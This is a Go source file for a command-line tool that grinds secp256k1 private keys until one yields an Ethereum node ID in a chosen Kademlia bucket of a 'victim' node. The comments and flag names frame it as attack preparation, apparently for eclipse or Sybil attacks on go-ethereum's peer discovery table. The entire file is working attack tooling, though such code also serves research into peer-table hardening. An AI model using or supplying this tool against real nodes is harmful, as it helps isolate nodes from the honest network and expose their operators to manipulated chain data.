// grind_nodekey.go -- brute-forces a secp256k1 private key whose resulting
// node ID lands in a specific Kademlia bucket relative to a target node ID.
//
// Usage:
//
//	go run grind_nodekey.go -target <victim-node-id-hex-64chars> -bucket 11 -out atkX-nodekey.txt
//
// Bucket formula matches go-ethereum's p2p/discover/table.go:
//
//	nBuckets = 16, hashBits = 256, bucketMinDistance = hashBits - nBuckets = 240
//	bucket = logdist(targetID, candidateID) - bucketMinDistance
//
// where logdist is the bit-length of the XOR of the two 256-bit IDs.
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"math/big"
	"os"

	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/p2p/enode"
)

func main() {
	targetHex := flag.String("target", "", "target (victim) node ID, 64 hex chars")
	wantBucket := flag.Int("bucket", 11, "desired bucket index")
	outFile := flag.String("out", "", "output file for the winning private key (hex)")
	flag.Parse()

	if *targetHex == "" || *outFile == "" {
		fmt.Fprintln(os.Stderr, "need -target and -out")
		os.Exit(1)
	}

	targetBytes, err := hex.DecodeString(*targetHex)
	if err != nil || len(targetBytes) != 32 {
		fmt.Fprintln(os.Stderr, "target must be 64 hex chars (32 bytes):", err)
		os.Exit(1)
	}
	target := new(big.Int).SetBytes(targetBytes)

	const bucketMinDistance = 240

	attempts := 0
	for {
		attempts++
		privkey, err := crypto.GenerateKey()
		if err != nil {
			continue
		}
		id := enode.PubkeyToIDV4(&privkey.PublicKey)
		idInt := new(big.Int).SetBytes(id[:])

		xor := new(big.Int).Xor(target, idInt)
		logdist := xor.BitLen()
		bucket := logdist - bucketMinDistance

		if bucket == *wantBucket {
			keyHex := hex.EncodeToString(crypto.FromECDSA(privkey))
			if err := os.WriteFile(*outFile, []byte(keyHex), 0600); err != nil {
				fmt.Fprintln(os.Stderr, "write failed:", err)
				os.Exit(1)
			}
			fmt.Printf("found after %d attempts: id=%x bucket=%d -> saved to %s\n",
				attempts, id[:8], bucket, *outFile)
			return
		}
		if attempts%500000 == 0 {
			fmt.Printf("still grinding... %d attempts so far\n", attempts)
		}
	}
}
